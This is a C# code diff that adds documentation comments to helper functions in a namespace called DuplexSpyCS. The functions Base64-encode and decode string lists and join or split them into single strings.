@@ -13,10 +13,42 @@ namespace DuplexSpyCS
 
         const string szChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
+        /// <summary>
+        /// Encode every item in List object with Base64.
+        /// </summary>
+        /// <param name="lsInput">Input List object for encoding</param>
+        /// <returns>Encoded List object</returns>
         public static List<string> fnListEncToB64(List<string> lsInput) => lsInput.Select(x => clsCrypto.b64E2Str(x)).ToList();
+        
+        /// <summary>
+        /// Decode every item in List object with Base64.
+        /// </summary>
+        /// <param name="lsInput">Input List object for decoding</param>
+        /// <returns>Decoded List object</returns>
         public static List<string> fnListDecFromB64(List<string> lsInput) => lsInput.Select(x => clsCrypto.b64D2Str(x)).ToList();
+        
+        /// <summary>
+        /// Compress a List object into a sole string object.
+        /// </summary>
+        /// <param name="lsInput"></param>
+        /// <param name="szSplitter"></param>
+        /// <returns></returns>
         public static string fnListStrToStr(List<string> lsInput, string szSplitter = ",") => string.Join(szSplitter, fnListEncToB64(lsInput));
+        
+        /// <summary>
+        /// Decompress a string into List object.
+        /// </summary>
+        /// <param name="szInput"></param>
+        /// <param name="szSplitter"></param>
+        /// <returns></returns>
         public static List<string> fnStrToListStr(string szInput, string szSplitter = ",") => fnListDecFromB64(szInput.Split(szSplitter).ToList());
+        
+        /// <summary>
+        /// Compress a two-dimension List object into a sole string object.
+        /// </summary>
+        /// <param name="szInput"></param>
+        /// <param name="szSplitter"></param>
+        /// <returns></returns>
         public static List<List<string>> fnStrTo2dList(string szInput, string szSplitter = ",")
         {
             if (string.IsNullOrEmpty(szInput)) return new List<List<string>>();
